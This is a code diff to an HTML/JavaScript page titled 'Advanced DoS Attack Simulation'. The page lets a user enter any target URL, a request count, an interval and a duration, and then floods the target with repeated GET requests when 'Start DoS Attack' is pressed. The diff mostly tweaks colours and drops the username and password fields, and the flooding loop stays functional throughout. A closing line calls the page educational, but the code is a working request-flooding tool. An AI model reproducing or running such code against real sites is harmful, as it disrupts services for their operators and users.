@@ -12,17 +12,17 @@
             margin: 0;
             padding: 20px;
             text-align: center;
-            color: #fff;
+            color: #000;
         }
 
         h1 {
-            color: #fff;
+            color: #000;
         }
 
         label {
             display: block;
             margin: 10px 0;
-            color: #fff;
+            color: #000;
         }
 
         input {
@@ -44,14 +44,14 @@
         }
 
         p {
-            color: #fff;
+            color: #000;
             margin-top: 20px;
         }
 
         #attackPanel {
             margin-top: 20px;
             text-align: left;
-            color: #fff;
+            color: #000;
         }
     </style>
     <script>
@@ -59,23 +59,19 @@
             var target = document.getElementById("targetWebsite").value;
             var intervalTime = document.getElementById("intervalTime").value;
             var duration = document.getElementById("duration").value;
-            var concurrentRequests = document.getElementById("concurrentRequests").value;
-            var username = document.getElementById("username").value;
-            var password = document.getElementById("password").value;
+            var numRequests = document.getElementById("numRequests").value;
 
             var attackPanel = document.getElementById("attackPanel");
 
-            attackPanel.innerHTML = `Attack Started at: ${new Date().toLocaleTimeString()}<br>`;
-            
             var interval = setInterval(function() {
-                for (let i = 0; i < concurrentRequests; i++) {
+                for (var i = 0; i < numRequests; i++) {
                     var xhr = new XMLHttpRequest();
-                    xhr.open("GET", target, true, username, password);
+                    xhr.open("GET", target, true);
                     xhr.send();
+
+                    // Display ongoing attack details in the panel
+                    attackPanel.innerHTML += `Attack: ${new Date().toLocaleTimeString()} | Duration: ${duration} ms | Requests: ${numRequests}<br>`;
                 }
-                
-                // Display ongoing attack details in the panel
-                attackPanel.innerHTML += `Launching ${concurrentRequests} requests | Target: ${target}<br>`;
             }, intervalTime);
 
             setTimeout(function() {
@@ -89,16 +85,12 @@
     <h1>Advanced DoS Attack Simulation</h1>
     <label for="targetWebsite">Target Website:</label>
     <input type="text" id="targetWebsite" placeholder="Enter target website URL">
-    <label for="username">Username:</label>
-    <input type="text" id="username" placeholder="Enter username">
-    <label for="password">Password:</label>
-    <input type="password" id="password" placeholder="Enter password">
     <label for="intervalTime">Interval Time (ms):</label>
     <input type="number" id="intervalTime" placeholder="Enter interval time in milliseconds" value="1000">
     <label for="duration">Attack Duration (ms):</label>
     <input type="number" id="duration" placeholder="Enter attack duration in milliseconds" value="5000">
-    <label for="concurrentRequests">Concurrent Requests:</label>
-    <input type="number" id="concurrentRequests" placeholder="Enter the number of concurrent requests" value="5">
+    <label for="numRequests">Number of Requests:</label>
+    <input type="number" id="numRequests" placeholder="Enter number of requests" value="1">
     <button onclick="initiateDoS()">Start DoS Attack</button>
     <div id="attackPanel"></div>
     <p>This is an educational simulation. Use responsibly and adhere to legal standards.</p>
